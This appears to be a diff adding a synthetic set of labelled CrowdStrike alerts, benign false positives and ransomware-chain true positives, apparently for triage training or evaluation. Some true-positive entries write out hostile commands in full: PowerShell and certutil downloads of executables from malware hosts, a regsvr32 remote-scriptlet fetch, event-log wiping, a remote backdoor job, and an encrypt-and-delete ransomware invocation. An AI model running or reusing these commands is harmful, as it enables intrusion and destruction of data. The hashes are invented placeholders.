+    "process": {
+      "name": "git.exe",
+      "pid": 7000,
+      "parent_process": "vscode.exe",
+      "parent_pid": 6900,
+      "command_line": "git.exe push origin main",
+      "file_path": "C:\\Program Files\\Git\\cmd\\git.exe",
+      "file_hash_sha256": "b6c7d8e9f0a1234567890123e3456789011abcdef1234567890abcdef1234578"
+    },
+    "network": {
+      "destination_ip": "140.82.114.4",
+      "destination_port": 443,
+      "bytes_sent": 307200,
+      "protocol": "HTTPS",
+      "domain": "github.com"
+    },
+    "tactic": "Exfiltration",
+    "technique": "T1567.001 - Exfiltration to Code Repository",
+    "crowdstrike_detection_name": "Code Push to External Repository",
+    "analyst_notes": "Developer pushing to approved company GitHub repo. Signed commit. FP."
+  },
+  {
+    "alert_id": "CS-2024-0028",
+    "timestamp": "2024-03-15T11:30:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "ITPC-052",
+      "ip_address": "192.168.20.52",
+      "os": "Windows 10 Pro",
+      "department": "IT",
+      "username": "it.admin03"
+    },
+    "process": {
+      "name": "msiexec.exe",
+      "pid": 8000,
+      "parent_process": "sccm_agent.exe",
+      "parent_pid": 7900,
+      "command_line": "msiexec.exe /i AdobeReader.msi /quiet",
+      "file_path": "C:\\Windows\\System32\\msiexec.exe",
+      "file_hash_sha256": "c7d8e9f0a1b2345678901234f3456789012abcdef1234567890abcdef1234579"
+    },
+    "network": {
+      "destination_ip": "192.168.1.50",
+      "destination_port": 443,
+      "bytes_sent": 1024000,
+      "protocol": "HTTPS",
+      "domain": "internal-sccm.company.com"
+    },
+    "tactic": "Execution",
+    "technique": "T1218.007 - Msiexec",
+    "crowdstrike_detection_name": "Silent MSI Installation",
+    "analyst_notes": "SCCM-pushed Adobe update. Silent install flag is standard. Approved. FP."
+  },
+  {
+    "alert_id": "CS-2024-0029",
+    "timestamp": "2024-03-15T12:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "FINPC-021",
+      "ip_address": "192.168.10.21",
+      "os": "Windows 10 Pro",
+      "department": "Finance",
+      "username": "fin.user10"
+    },
+    "process": {
+      "name": "excel.exe",
+      "pid": 9000,
+      "parent_process": "explorer.exe",
+      "parent_pid": 8900,
+      "command_line": "excel.exe /e QuarterlyReport.xlsm",
+      "file_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+      "file_hash_sha256": "d8e9f0a1b2c3456789012345a4567890013abcdef1234567890abcdef123457a"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Execution",
+    "technique": "T1137 - Office Application Startup",
+    "crowdstrike_detection_name": "Macro-Enabled Excel File Opened",
+    "analyst_notes": "Finance macro-enabled workbook. Internal file, no network activity. FP."
+  },
+  {
+    "alert_id": "CS-2024-0030",
+    "timestamp": "2024-03-15T12:30:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "OPSPC-044",
+      "ip_address": "192.168.50.44",
+      "os": "Windows 10 Pro",
+      "department": "Operations",
+      "username": "ops.user11"
+    },
+    "process": {
+      "name": "certutil.exe",
+      "pid": 1200,
+      "parent_process": "cmd.exe",
+      "parent_pid": 1100,
+      "command_line": "certutil.exe -hashfile C:\\installers\\setup.exe SHA256",
+      "file_path": "C:\\Windows\\System32\\certutil.exe",
+      "file_hash_sha256": "e9f0a1b2c3d4567890123456b4567890014abcdef1234567890abcdef123457b"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Defense Evasion",
+    "technique": "T1140 - Deobfuscate/Decode Files",
+    "crowdstrike_detection_name": "Certutil Hash Verification",
+    "analyst_notes": "Ops team verifying installer hash before deployment. Standard practice. FP."
+  },
+  {
+    "alert_id": "CS-2024-0031",
+    "timestamp": "2024-03-15T13:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "ITPC-053",
+      "ip_address": "192.168.20.53",
+      "os": "Windows 10 Pro",
+      "department": "IT",
+      "username": "it.admin04"
+    },
+    "process": {
+      "name": "vssadmin.exe",
+      "pid": 2200,
+      "parent_process": "backup_agent.exe",
+      "parent_pid": 2100,
+      "command_line": "vssadmin.exe create shadow /for=C:",
+      "file_path": "C:\\Windows\\System32\\vssadmin.exe",
+      "file_hash_sha256": "f0a1b2c3d4e5678901234567c4567890015abcdef1234567890abcdef123457c"
+    },
+    "network": {
+      "destination_ip": "192.168.1.80",
+      "destination_port": 443,
+      "bytes_sent": 2048000,
+      "protocol": "HTTPS",
+      "domain": "backup-srv.company.com"
+    },
+    "tactic": "Impact",
+    "technique": "T1490 - Inhibit System Recovery",
+    "crowdstrike_detection_name": "VSS Shadow Copy Activity",
+    "analyst_notes": "IT backup agent creating shadow copy for nightly backup. Scheduled. FP."
+  },
+  {
+    "alert_id": "CS-2024-0032",
+    "timestamp": "2024-03-15T13:30:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "LEGPC-012",
+      "ip_address": "192.168.60.12",
+      "os": "Windows 10 Pro",
+      "department": "Legal",
+      "username": "legal.user12"
+    },
+    "process": {
+      "name": "acrobat.exe",
+      "pid": 3200,
+      "parent_process": "explorer.exe",
+      "parent_pid": 3100,
+      "command_line": "acrobat.exe NDA_Agreement.pdf",
+      "file_path": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
+      "file_hash_sha256": "a1b2c3d4e5f6789012345678d4567890016abcdef1234567890abcdef123457d"
+    },
+    "network": {
+      "destination_ip": "17.253.144.10",
+      "destination_port": 443,
+      "bytes_sent": 1024,
+      "protocol": "HTTPS",
+      "domain": "acroipm2.adobe.com"
+    },
+    "tactic": "Command and Control",
+    "technique": "T1071.001 - Web Protocols",
+    "crowdstrike_detection_name": "Adobe Acrobat Network Connection",
+    "analyst_notes": "Acrobat license check on open. Adobe infrastructure IP. FP."
+  },
+  {
+    "alert_id": "CS-2024-0033",
+    "timestamp": "2024-03-15T14:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "DEVPC-077",
+      "ip_address": "192.168.70.77",
+      "os": "Windows 10 Pro",
+      "department": "Development",
+      "username": "dev.user13"
+    },
+    "process": {
+      "name": "python.exe",
+      "pid": 4300,
+      "parent_process": "vscode.exe",
+      "parent_pid": 4200,
+      "command_line": "python.exe -m pytest tests/",
+      "file_path": "C:\\Python310\\python.exe",
+      "file_hash_sha256": "b2c3d4e5f6a7890123456789e4567890017abcdef1234567890abcdef123457e"
+    },
+    "network": {
+      "destination_ip": "192.168.70.1",
+      "destination_port": 5000,
+      "bytes_sent": 4096,
+      "protocol": "HTTP",
+      "domain": "localhost"
+    },
+    "tactic": "Discovery",
+    "technique": "T1049 - System Network Connections Discovery",
+    "crowdstrike_detection_name": "Python Localhost Network Activity",
+    "analyst_notes": "Dev running unit tests against local test server. FP."
+  },
+  {
+    "alert_id": "CS-2024-0034",
+    "timestamp": "2024-03-15T14:30:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "SALESPC-033",
+      "ip_address": "192.168.40.33",
+      "os": "Windows 10 Pro",
+      "department": "Sales",
+      "username": "sales.user14"
+    },
+    "process": {
+      "name": "teams.exe",
+      "pid": 5300,
+      "parent_process": "explorer.exe",
+      "parent_pid": 5200,
+      "command_line": "teams.exe --processStart teams.exe",
+      "file_path": "C:\\Users\\sales.user14\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
+      "file_hash_sha256": "c3d4e5f6a7b8901234567890f4567890018abcdef1234567890abcdef123457f"
+    },
+    "network": {
+      "destination_ip": "52.113.194.132",
+      "destination_port": 443,
+      "bytes_sent": 1048576,
+      "protocol": "HTTPS",
+      "domain": "teams.microsoft.com"
+    },
+    "tactic": "Exfiltration",
+    "technique": "T1048 - Exfiltration Over Alternative Protocol",
+    "crowdstrike_detection_name": "Large Data Transfer via Teams",
+    "analyst_notes": "Teams video call data. Microsoft IP range confirmed. FP."
+  },
+  {
+    "alert_id": "CS-2024-0035",
+    "timestamp": "2024-03-15T15:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "ITPC-054",
+      "ip_address": "192.168.20.54",
+      "os": "Windows 10 Pro",
+      "department": "IT",
+      "username": "it.admin05"
+    },
+    "process": {
+      "name": "reg.exe",
+      "pid": 6300,
+      "parent_process": "gpo_update.exe",
+      "parent_pid": 6200,
+      "command_line": "reg.exe add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer /t REG_SZ /d http://wsus.company.com",
+      "file_path": "C:\\Windows\\System32\\reg.exe",
+      "file_hash_sha256": "d4e5f6a7b8c9012345678901a5678901019abcdef1234567890abcdef1234580"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Defense Evasion",
+    "technique": "T1112 - Modify Registry",
+    "crowdstrike_detection_name": "Registry Modification - Windows Update Policy",
+    "analyst_notes": "GPO applying WSUS server registry key. Scheduled policy push. FP."
+  },
+  {
+    "alert_id": "CS-2024-0036",
+    "timestamp": "2024-03-15T07:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "OPSPC-055",
+      "ip_address": "192.168.50.55",
+      "os": "Windows 10 Pro",
+      "department": "Operations",
+      "username": "ops.user15"
+    },
+    "process": {
+      "name": "cmd.exe",
+      "pid": 7300,
+      "parent_process": "task_scheduler.exe",
+      "parent_pid": 7200,
+      "command_line": "cmd.exe /c C:\\Scripts\\cleanup_logs.bat",
+      "file_path": "C:\\Windows\\System32\\cmd.exe",
+      "file_hash_sha256": "e5f6a7b8c9d0123456789012b5678901020abcdef1234567890abcdef1234581"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Execution",
+    "technique": "T1059.003 - Windows Command Shell",
+    "crowdstrike_detection_name": "Scheduled Batch Script Execution",
+    "analyst_notes": "Daily 7AM log cleanup script. Task Scheduler parent. Internal script. FP."
+  },
+  {
+    "alert_id": "CS-2024-0037",
+    "timestamp": "2024-03-15T15:30:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "HRPC-021",
+      "ip_address": "192.168.11.21",
+      "os": "Windows 10 Pro",
+      "department": "HR",
+      "username": "hr.user16"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 8300,
+      "parent_process": "sccm_agent.exe",
+      "parent_pid": 8200,
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\SCCM\\inventory.ps1",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "file_hash_sha256": "f6a7b8c9d0e1234567890123c5678901021abcdef1234567890abcdef1234582"
+    },
+    "network": {
+      "destination_ip": "192.168.1.50",
+      "destination_port": 443,
+      "bytes_sent": 10240,
+      "protocol": "HTTPS",
+      "domain": "internal-sccm.company.com"
+    },
+    "tactic": "Discovery",
+    "technique": "T1082 - System Information Discovery",
+    "crowdstrike_detection_name": "PowerShell System Inventory Script",
+    "analyst_notes": "SCCM hardware inventory collection. Known safe script hash. FP."
+  },
+  {
+    "alert_id": "CS-2024-0038",
+    "timestamp": "2024-03-15T16:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "EXECPC-002",
+      "ip_address": "192.168.5.2",
+      "os": "Windows 11 Pro",
+      "department": "Executive",
+      "username": "exec.user17"
+    },
+    "process": {
+      "name": "zoom.exe",
+      "pid": 9300,
+      "parent_process": "explorer.exe",
+      "parent_pid": 9200,
+      "command_line": "zoom.exe",
+      "file_path": "C:\\Users\\exec.user17\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe",
+      "file_hash_sha256": "a7b8c9d0e1f2345678901234d5678901022abcdef1234567890abcdef1234583"
+    },
+    "network": {
+      "destination_ip": "170.114.52.2",
+      "destination_port": 443,
+      "bytes_sent": 2097152,
+      "protocol": "HTTPS",
+      "domain": "zoom.us"
+    },
+    "tactic": "Exfiltration",
+    "technique": "T1048 - Exfiltration Over Alternative Protocol",
+    "crowdstrike_detection_name": "Large Upload via Video Conferencing App",
+    "analyst_notes": "Board meeting Zoom session. Known Zoom IP range. Screensharing data. FP."
+  },
+  {
+    "alert_id": "CS-2024-0039",
+    "timestamp": "2024-03-15T16:30:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "FINPC-033",
+      "ip_address": "192.168.10.33",
+      "os": "Windows 10 Pro",
+      "department": "Finance",
+      "username": "fin.user18"
+    },
+    "process": {
+      "name": "wscript.exe",
+      "pid": 1400,
+      "parent_process": "task_scheduler.exe",
+      "parent_pid": 1300,
+      "command_line": "wscript.exe C:\\Finance\\Scripts\\currency_rates.vbs",
+      "file_path": "C:\\Windows\\System32\\wscript.exe",
+      "file_hash_sha256": "b8c9d0e1f2a3456789012345e5678901023abcdef1234567890abcdef1234584"
+    },
+    "network": {
+      "destination_ip": "192.168.1.90",
+      "destination_port": 443,
+      "bytes_sent": 2048,
+      "protocol": "HTTPS",
+      "domain": "internal-rates-api.company.com"
+    },
+    "tactic": "Execution",
+    "technique": "T1059.005 - Visual Basic",
+    "crowdstrike_detection_name": "Scheduled VBScript Execution",
+    "analyst_notes": "Finance daily currency rate fetch script. Scheduled task, internal API. FP."
+  },
+  {
+    "alert_id": "CS-2024-0040",
+    "timestamp": "2024-03-15T17:00:00Z",
+    "severity": "Low",
+    "category": "False Positive (noise)",
+    "true_label": "False Positive",
+    "device": {
+      "hostname": "ITPC-055",
+      "ip_address": "192.168.20.55",
+      "os": "Windows 10 Pro",
+      "department": "IT",
+      "username": "it.admin06"
+    },
+    "process": {
+      "name": "robocopy.exe",
+      "pid": 2400,
+      "parent_process": "backup_agent.exe",
+      "parent_pid": 2300,
+      "command_line": "robocopy.exe C:\\Data \\\\FILESERVER-02\\Backup\\ITPC-055 /MIR /Z",
+      "file_path": "C:\\Windows\\System32\\robocopy.exe",
+      "file_hash_sha256": "c9d0e1f2a3b4567890123456f5678901024abcdef1234567890abcdef1234585"
+    },
+    "network": {
+      "destination_ip": "192.168.1.20",
+      "destination_port": 445,
+      "bytes_sent": 5242880,
+      "protocol": "SMB",
+      "domain": "internal"
+    },
+    "tactic": "Exfiltration",
+    "technique": "T1039 - Data from Network Shared Drive",
+    "crowdstrike_detection_name": "Large SMB File Transfer",
+    "analyst_notes": "Nightly backup robocopy job to file server. Backup agent parent. FP."
+  },
+  {
+    "alert_id": "CS-2024-0041",
+    "timestamp": "2024-03-15T05:00:00Z",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "FILESERVER-02",
+      "ip_address": "192.168.1.20",
+      "os": "Windows Server 2019",
+      "department": "IT Infrastructure",
+      "username": "SYSTEM"
+    },
+    "process": {
+      "name": "conhost.exe",
+      "pid": 3400,
+      "parent_process": "unknown.exe",
+      "parent_pid": 3300,
+      "command_line": "conhost.exe 0xffffffff -ForceV1",
+      "file_path": "C:\\Windows\\System32\\conhost.exe",
+      "file_hash_sha256": "d0e1f2a3b4c5678901234567a6789012025abcdef1234567890abcdef1234586"
+    },
+    "network": {
+      "destination_ip": "185.220.101.47",
+      "destination_port": 443,
+      "bytes_sent": 10485760,
+      "protocol": "HTTPS",
+      "domain": "cdn-update-service.ru"
+    },
+    "tactic": "Exfiltration",
+    "technique": "T1041 - Exfiltration Over C2 Channel",
+    "crowdstrike_detection_name": "Mass Data Exfiltration Before Encryption",
+    "analyst_notes": "10MB sent to same C2 as CS-2024-0001. File server exfiltration pre-ransomware."
+  },
+  {
+    "alert_id": "CS-2024-0042",
+    "timestamp": "2024-03-15T06:30:00Z",
+    "severity": "High",
+    "category": "Phishing/Malicious downloads",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "LEGPC-015",
+      "ip_address": "192.168.60.15",
+      "os": "Windows 10 Pro",
+      "department": "Legal",
+      "username": "legal.user19"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 4500,
+      "parent_process": "outlook.exe",
+      "parent_pid": 4400,
+      "command_line": "powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile('http://evil-docs.net/loader.exe','C:\\Users\\legal.user19\\AppData\\Local\\Temp\\loader.exe')",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "file_hash_sha256": "e1f2a3b4c5d6789012345678b6789012026abcdef1234567890abcdef1234587"
+    },
+    "network": {
+      "destination_ip": "193.32.162.55",
+      "destination_port": 80,
+      "bytes_sent": 512000,
+      "protocol": "HTTP",
+      "domain": "evil-docs.net"
+    },
+    "tactic": "Initial Access",
+    "technique": "T1566.001 - Spearphishing Attachment",
+    "crowdstrike_detection_name": "PowerShell Dropper from Outlook",
+    "analyst_notes": "Loader dropped via PS from email. evil-docs.net flagged as malware distribution."
+  },
+  {
+    "alert_id": "CS-2024-0043",
+    "timestamp": "2024-03-15T18:00:00Z",
+    "severity": "High",
+    "category": "Lateral Movement",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "SALESPC-040",
+      "ip_address": "192.168.40.40",
+      "os": "Windows 10 Pro",
+      "department": "Sales",
+      "username": "sales.user20"
+    },
+    "process": {
+      "name": "mstsc.exe",
+      "pid": 5500,
+      "parent_process": "cmd.exe",
+      "parent_pid": 5400,
+      "command_line": "mstsc.exe /v:192.168.1.10:3389",
+      "file_path": "C:\\Windows\\System32\\mstsc.exe",
+      "file_hash_sha256": "f2a3b4c5d6e7890123456789c6789012027abcdef1234567890abcdef1234588"
+    },
+    "network": {
+      "destination_ip": "192.168.1.10",
+      "destination_port": 3389,
+      "bytes_sent": 102400,
+      "protocol": "RDP",
+      "domain": "internal"
+    },
+    "tactic": "Lateral Movement",
+    "technique": "T1021.001 - Remote Desktop Protocol",
+    "crowdstrike_detection_name": "RDP from Endpoint to Domain Controller",
+    "analyst_notes": "Sales user RDPing directly to DC at 6PM. No IT ticket. Anomalous."
+  },
+  {
+    "alert_id": "CS-2024-0044",
+    "timestamp": "2024-03-15T19:00:00Z",
+    "severity": "High",
+    "category": "Privilege Escalation",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "DEVPC-088",
+      "ip_address": "192.168.70.88",
+      "os": "Windows 10 Pro",
+      "department": "Development",
+      "username": "dev.user21"
+    },
+    "process": {
+      "name": "eventvwr.exe",
+      "pid": 6500,
+      "parent_process": "cmd.exe",
+      "parent_pid": 6400,
+      "command_line": "eventvwr.exe",
+      "file_path": "C:\\Windows\\System32\\eventvwr.exe",
+      "file_hash_sha256": "a3b4c5d6e7f8901234567890d6789012028abcdef1234567890abcdef1234589"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Privilege Escalation",
+    "technique": "T1548.002 - Bypass User Account Control",
+    "crowdstrike_detection_name": "UAC Bypass via Event Viewer",
+    "analyst_notes": "eventvwr UAC bypass technique. Paired with registry mscfile modification."
+  },
+  {
+    "alert_id": "CS-2024-0045",
+    "timestamp": "2024-03-15T20:00:00Z",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "DCSERVER-01",
+      "ip_address": "192.168.1.10",
+      "os": "Windows Server 2022",
+      "department": "IT Infrastructure",
+      "username": "SYSTEM"
+    },
+    "process": {
+      "name": "wevtutil.exe",
+      "pid": 7500,
+      "parent_process": "cmd.exe",
+      "parent_pid": 7400,
+      "command_line": "wevtutil.exe cl System && wevtutil.exe cl Security && wevtutil.exe cl Application",
+      "file_path": "C:\\Windows\\System32\\wevtutil.exe",
+      "file_hash_sha256": "b4c5d6e7f8a9012345678901e6789012029abcdef1234567890abcdef123458a"
+    },
+    "network": {
+      "destination_ip": "0.0.0.0",
+      "destination_port": 0,
+      "bytes_sent": 0,
+      "protocol": "None",
+      "domain": "None"
+    },
+    "tactic": "Defense Evasion",
+    "technique": "T1070.001 - Clear Windows Event Logs",
+    "crowdstrike_detection_name": "Event Log Clearing on Domain Controller",
+    "analyst_notes": "All Windows event logs cleared on DC. Anti-forensic step in ransomware chain."
+  },
+  {
+    "alert_id": "CS-2024-0046",
+    "timestamp": "2024-03-15T20:30:00Z",
+    "severity": "High",
+    "category": "Phishing/Malicious downloads",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "OPSPC-066",
+      "ip_address": "192.168.50.66",
+      "os": "Windows 10 Pro",
+      "department": "Operations",
+      "username": "ops.user22"
+    },
+    "process": {
+      "name": "regsvr32.exe",
+      "pid": 8500,
+      "parent_process": "winword.exe",
+      "parent_pid": 8400,
+      "command_line": "regsvr32.exe /s /u /i:http://evil-payloads.com/payload.sct scrobj.dll",
+      "file_path": "C:\\Windows\\System32\\regsvr32.exe",
+      "file_hash_sha256": "c5d6e7f8a9b0123456789012f6789012030abcdef1234567890abcdef123458b"
+    },
+    "network": {
+      "destination_ip": "185.234.219.60",
+      "destination_port": 80,
+      "bytes_sent": 30720,
+      "protocol": "HTTP",
+      "domain": "evil-payloads.com"
+    },
+    "tactic": "Defense Evasion",
+    "technique": "T1218.010 - Regsvr32",
+    "crowdstrike_detection_name": "Regsvr32 Squiblydoo Technique",
+    "analyst_notes": "Classic Squiblydoo LOLBAS technique from Word doc. Remote SCT payload."
+  },
+  {
+    "alert_id": "CS-2024-0047",
+    "timestamp": "2024-03-15T21:00:00Z",
+    "severity": "High",
+    "category": "Lateral Movement",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "ITPC-060",
+      "ip_address": "192.168.20.60",
+      "os": "Windows 10 Pro",
+      "department": "IT",
+      "username": "it.svc_account"
+    },
+    "process": {
+      "name": "at.exe",
+      "pid": 9500,
+      "parent_process": "cmd.exe",
+      "parent_pid": 9400,
+      "command_line": "at.exe \\\\192.168.1.20 02:00 cmd.exe /c C:\\backdoor2.exe",
+      "file_path": "C:\\Windows\\System32\\at.exe",
+      "file_hash_sha256": "d6e7f8a9b0c1234567890123a7890123031abcdef1234567890abcdef123458c"
+    },
+    "network": {
+      "destination_ip": "192.168.1.20",
+      "destination_port": 445,
+      "bytes_sent": 20480,
+      "protocol": "SMB",
+      "domain": "internal"
+    },
+    "tactic": "Lateral Movement",
+    "technique": "T1053.002 - At",
+    "crowdstrike_detection_name": "Remote AT Job Scheduled on File Server",
+    "analyst_notes": "Remote AT job scheduling backdoor on file server. Persistence + lateral move."
+  },
+  {
+    "alert_id": "CS-2024-0048",
+    "timestamp": "2024-03-15T21:30:00Z",
+    "severity": "Critical",
+    "category": "Privilege Escalation",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "DCSERVER-01",
+      "ip_address": "192.168.1.10",
+      "os": "Windows Server 2022",
+      "department": "IT Infrastructure",
+      "username": "krbtgt"
+    },
+    "process": {
+      "name": "lsass.exe",
+      "pid": 700,
+      "parent_process": "wininit.exe",
+      "parent_pid": 500,
+      "command_line": "lsass.exe",
+      "file_path": "C:\\Windows\\System32\\lsass.exe",
+      "file_hash_sha256": "e7f8a9b0c1d2345678901234b7890123032abcdef1234567890abcdef123458d"
+    },
+    "network": {
+      "destination_ip": "192.168.20.10",
+      "destination_port": 88,
+      "bytes_sent": 40960,
+      "protocol": "Kerberos",
+      "domain": "internal"
+    },
+    "tactic": "Privilege Escalation",
+    "technique": "T1558.001 - Golden Ticket",
+    "crowdstrike_detection_name": "Kerberos Golden Ticket Activity Detected",
+    "analyst_notes": "Forged Kerberos TGT detected. krbtgt hash likely compromised. Golden Ticket attack."
+  },
+  {
+    "alert_id": "CS-2024-0049",
+    "timestamp": "2024-03-15T22:00:00Z",
+    "severity": "High",
+    "category": "Phishing/Malicious downloads",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "MKTPC-020",
+      "ip_address": "192.168.30.20",
+      "os": "Windows 10 Pro",
+      "department": "Marketing",
+      "username": "mkt.user23"
+    },
+    "process": {
+      "name": "certutil.exe",
+      "pid": 1600,
+      "parent_process": "cmd.exe",
+      "parent_pid": 1500,
+      "command_line": "certutil.exe -urlcache -split -f http://malware-drop.net/agent.exe C:\\Users\\mkt.user23\\AppData\\Local\\Temp\\agent.exe",
+      "file_path": "C:\\Windows\\System32\\certutil.exe",
+      "file_hash_sha256": "f8a9b0c1d2e3456789012345c7890123033abcdef1234567890abcdef123458e"
+    },
+    "network": {
+      "destination_ip": "91.108.56.200",
+      "destination_port": 80,
+      "bytes_sent": 409600,
+      "protocol": "HTTP",
+      "domain": "malware-drop.net"
+    },
+    "tactic": "Defense Evasion",
+    "technique": "T1105 - Ingress Tool Transfer",
+    "crowdstrike_detection_name": "Certutil Used as Downloader",
+    "analyst_notes": "Certutil LOLBAS downloading EXE from known malware domain. TP confirmed."
+  },
+  {
+    "alert_id": "CS-2024-0050",
+    "timestamp": "2024-03-15T22:45:00Z",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "true_label": "True Positive",
+    "device": {
+      "hostname": "FINPC-042",
+      "ip_address": "192.168.10.42",
+      "os": "Windows 10 Pro",
+      "department": "Finance",
+      "username": "sarah.thompson"
+    },
+    "process": {
+      "name": "encrypt_all.exe",
+      "pid": 2600,
+      "parent_process": "unknown.exe",
+      "parent_pid": 2500,
+      "command_line": "encrypt_all.exe --target C:\\ --ext .locked --delete-originals",
+      "file_path": "C:\\Users\\sarah.thompson\\AppData\\Local\\Temp\\encrypt_all.exe",
+      "file_hash_sha256": "a9b0c1d2e3f4567890123456d7890123034abcdef1234567890abcdef123458f"
+    },
+    "network": {
+      "destination_ip": "185.220.101.47",
+      "destination_port": 443,
+      "bytes_sent": 204800,
+      "protocol": "HTTPS",
+      "domain": "cdn-update-service.ru"
+    },
+    "tactic": "Impact",
+    "technique": "T1486 - Data Encrypted for Impact",
+    "crowdstrike_detection_name": "Active Ransomware Encryption Detected",
+    "analyst_notes": "CRITICAL - Active encryption happening NOW. Isolate FINPC-042 immediately. Same C2 as CS-2024-0001."
+  }
+]
